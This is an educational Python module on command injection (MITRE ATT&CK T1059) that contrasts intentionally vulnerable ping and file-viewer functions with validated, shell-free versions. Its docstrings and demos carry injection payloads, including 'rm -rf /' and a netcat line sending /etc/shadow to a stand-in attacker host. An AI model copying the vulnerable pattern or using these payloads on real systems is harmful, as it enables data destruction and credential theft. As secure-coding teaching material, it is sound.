"""
MITRE ATT&CK T1059 - Command and Scripting Interpreter: Command Injection

Command injection occurs when an application passes unsanitized user input 
to a system shell, allowing attackers to execute arbitrary commands.

This module demonstrates:
1. VULNERABLE code that allows command injection
2. DEFENDED code using proper subprocess handling and input validation

Educational purpose: Shows the risk of command injection and secure alternatives.
"""

import os
import subprocess
import shlex
import re
from typing import List, Optional


# =============================================================================
# VULNERABLE IMPLEMENTATION - DO NOT USE IN PRODUCTION
# =============================================================================

def vulnerable_ping(host: str) -> str:
    """
    ⚠️  VULNERABLE TO T1059 (Command Injection)
    
    This function demonstrates a common vulnerability where user input
    is directly passed to os.system() or shell=True in subprocess.
    
    Attack example:
        host = "8.8.8.8; cat /etc/passwd"
        This would ping 8.8.8.8 AND then execute "cat /etc/passwd"
    
    Args:
        host: IP address or hostname (UNSANITIZED USER INPUT)
        
    Returns:
        Command output
    """
    # VULNERABLE: User input directly in shell command
    command = f"ping -c 1 {host}"
    
    print(f"[VULNERABLE] Executing: {command}")
    
    # os.system() passes the entire command to a shell
    # This allows command chaining with ; | & and other shell metacharacters
    exit_code = os.system(command)
    
    return f"Command exited with code: {exit_code}"


def vulnerable_file_viewer(filename: str) -> str:
    """
    ⚠️  VULNERABLE TO T1059 (Command Injection)
    
    This simulates a web endpoint that displays file contents.
    Attacker can inject commands through the filename parameter.
    
    Attack example:
        filename = "file.txt; rm -rf /"
        filename = "file.txt | nc attacker.com 4444 < /etc/shadow"
    
    Args:
        filename: File to view (UNSANITIZED USER INPUT)
        
    Returns:
        File contents or command output
    """
    # VULNERABLE: Using subprocess with shell=True
    command = f"cat {filename}"
    
    print(f"[VULNERABLE] Executing: {command}")
    
    try:
        # shell=True is dangerous - it invokes a shell interpreter
        result = subprocess.run(
            command,
            shell=True,  # ⚠️  VULNERABLE!
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return "Command timed out"


# =============================================================================
# DEFENDED IMPLEMENTATION - SECURE AGAINST T1059
# =============================================================================

def is_valid_ip_or_hostname(host: str) -> bool:
    """
    Validate that input is a legitimate IP address or hostname.
    
    Defense against T1059: Allowlisting valid input patterns.
    """
    # Pattern for IPv4 address
    ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    
    # Pattern for hostname (alphanumeric, dots, hyphens)
    hostname_pattern = r'^[a-zA-Z0-9][a-zA-Z0-9\-\.]*[a-zA-Z0-9]$'
    
    if re.match(ipv4_pattern, host):
        # Validate each octet is 0-255
        octets = host.split('.')
        return all(0 <= int(octet) <= 255 for octet in octets)
    
    if re.match(hostname_pattern, host):
        # Additional checks for valid hostname
        if len(host) > 253 or '..' in host:
            return False
        return True
    
    return False


def defended_ping(host: str) -> str:
    """
    ✅ DEFENDED AGAINST T1059 (Command Injection)
    
    This function demonstrates secure command execution:
    1. Input validation (allowlisting)
    2. Using subprocess with argument list (no shell)
    3. No string interpolation in commands
    
    Args:
        host: IP address or hostname
        
    Returns:
        Command output or error message
    """
    # Defense 1: Validate input against allowlist
    if not is_valid_ip_or_hostname(host):
        return f"[DEFENDED] Invalid input: {host} (T1059 defense: input validation)"
    
    # Defense 2: Use subprocess with argument list, NOT shell=True
    # Each argument is passed separately, preventing command injection
    command = ["ping", "-c", "1", host]
    
    print(f"[DEFENDED] Executing: {command}")
    
    try:
        # shell=False (default) - arguments are NOT interpreted by shell
        result = subprocess.run(
            command,
            shell=False,  # ✅ SECURE - no shell interpretation
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except subprocess.SubprocessError as e:
        return f"Error executing command: {e}"


def is_valid_filename(filename: str, allowed_directory: str = "/tmp") -> bool:
    """
    Validate filename to prevent directory traversal and command injection.
    
    Defense against T1059 and T1083 (File and Directory Discovery).
    """
    # Reject obvious shell metacharacters
    dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '>', '<']
    if any(char in filename for char in dangerous_chars):
        return False
    
    # Reject path traversal attempts
    if '..' in filename or filename.startswith('/'):
        return False
    
    # Construct full path and verify it's within allowed directory
    try:
        full_path = os.path.realpath(os.path.join(allowed_directory, filename))
        allowed_path = os.path.realpath(allowed_directory)
        
        # Ensure the resolved path is within the allowed directory
        if not full_path.startswith(allowed_path):
            return False
        
        return True
    except (ValueError, OSError):
        return False


def defended_file_viewer(filename: str, allowed_directory: str = "/tmp") -> str:
    """
    ✅ DEFENDED AGAINST T1059 (Command Injection)
    
    This function demonstrates secure file access:
    1. Input validation and sanitization
    2. Path traversal prevention
    3. Using Python's built-in file operations (no shell commands)
    
    Args:
        filename: File to view
        allowed_directory: Base directory to restrict access
        
    Returns:
        File contents or error message
    """
    # Defense 1: Validate filename
    if not is_valid_filename(filename, allowed_directory):
        return f"[DEFENDED] Invalid filename: {filename} (T1059 defense: input validation)"
    
    # Defense 2: Use Python's built-in file operations, NOT subprocess
    full_path = os.path.join(allowed_directory, filename)
    
    print(f"[DEFENDED] Reading file: {full_path}")
    
    try:
        # Direct file access - no shell involved
        with open(full_path, 'r') as f:
            content = f.read(10000)  # Limit size
        return content
    except FileNotFoundError:
        return f"File not found: {filename}"
    except PermissionError:
        return f"Permission denied: {filename}"
    except Exception as e:
        return f"Error reading file: {e}"


# =============================================================================
# DEMONSTRATION AND TESTING
# =============================================================================

def demo_vulnerable_code():
    """Demonstrate how command injection works (T1059)."""
    print("\n" + "=" * 70)
    print("VULNERABLE CODE DEMONSTRATION (T1059)")
    print("=" * 70)
    
    print("\n1. Normal usage:")
    result = vulnerable_ping("8.8.8.8")
    print(f"Result: {result}\n")
    
    print("2. Command injection attack:")
    print("   Attacker input: '8.8.8.8; echo INJECTED_COMMAND'")
    # This would execute both ping AND the injected command
    malicious_input = "8.8.8.8; echo 'INJECTED_COMMAND - attacker could run: cat /etc/passwd'"
    result = vulnerable_ping(malicious_input)
    print(f"Result: {result}\n")
    
    print("3. File viewer command injection:")
    print("   Attacker input: 'file.txt; whoami'")
    malicious_input = "file.txt; echo 'INJECTED - attacker identity:' && whoami"
    result = vulnerable_file_viewer(malicious_input)
    print(f"Result: {result}\n")


def demo_defended_code():
    """Demonstrate secure implementation that blocks T1059."""
    print("\n" + "=" * 70)
    print("DEFENDED CODE DEMONSTRATION (T1059 Prevention)")
    print("=" * 70)
    
    print("\n1. Normal usage - allowed:")
    result = defended_ping("8.8.8.8")
    print(f"Result: {result[:100]}...\n")
    
    print("2. Command injection attempt - BLOCKED:")
    print("   Attacker input: '8.8.8.8; echo INJECTED'")
    malicious_input = "8.8.8.8; echo INJECTED"
    result = defended_ping(malicious_input)
    print(f"Result: {result}\n")
    
    print("3. Another injection attempt - BLOCKED:")
    print("   Attacker input: '8.8.8.8 | cat /etc/passwd'")
    malicious_input = "8.8.8.8 | cat /etc/passwd"
    result = defended_ping(malicious_input)
    print(f"Result: {result}\n")
    
    # Create a test file
    test_file = "/tmp/test_mitre_attack.txt"
    with open(test_file, 'w') as f:
        f.write("This is a test file for MITRE ATT&CK demo.")
    
    print("4. File viewer - normal usage:")
    result = defended_file_viewer("test_mitre_attack.txt", "/tmp")
    print(f"Result: {result}\n")
    
    print("5. File viewer - command injection attempt - BLOCKED:")
    print("   Attacker input: 'test.txt; cat /etc/passwd'")
    malicious_input = "test.txt; cat /etc/passwd"
    result = defended_file_viewer(malicious_input, "/tmp")
    print(f"Result: {result}\n")
    
    print("6. File viewer - path traversal attempt - BLOCKED:")
    print("   Attacker input: '../../etc/passwd'")
    malicious_input = "../../etc/passwd"
    result = defended_file_viewer(malicious_input, "/tmp")
    print(f"Result: {result}\n")
    
    # Cleanup
    try:
        os.remove(test_file)
    except:
        pass


if __name__ == "__main__":
    print("=" * 70)
    print("MITRE ATT&CK T1059 - Command Injection Demo")
    print("=" * 70)
    print("\nThis demo shows command injection vulnerabilities and defenses.")
    print("\nWARNING: The vulnerable examples are for educational purposes only!")
    
    # Show vulnerable code
    demo_vulnerable_code()
    
    # Show defended code
    demo_defended_code()
    
    # Summary
    print("=" * 70)
    print("KEY DEFENSES AGAINST T1059 (Command Injection):")
    print("=" * 70)
    print("1. ✅ Use subprocess with argument lists (shell=False)")
    print("2. ✅ Validate and sanitize ALL user input")
    print("3. ✅ Use allowlists for permitted characters/patterns")
    print("4. ✅ Avoid os.system() and shell=True")
    print("5. ✅ Use built-in language functions instead of shell commands")
    print("6. ✅ Apply principle of least privilege to command execution")
    print("7. ✅ Consider using safer alternatives (e.g., libraries vs. CLI tools)")
    print("=" * 70)
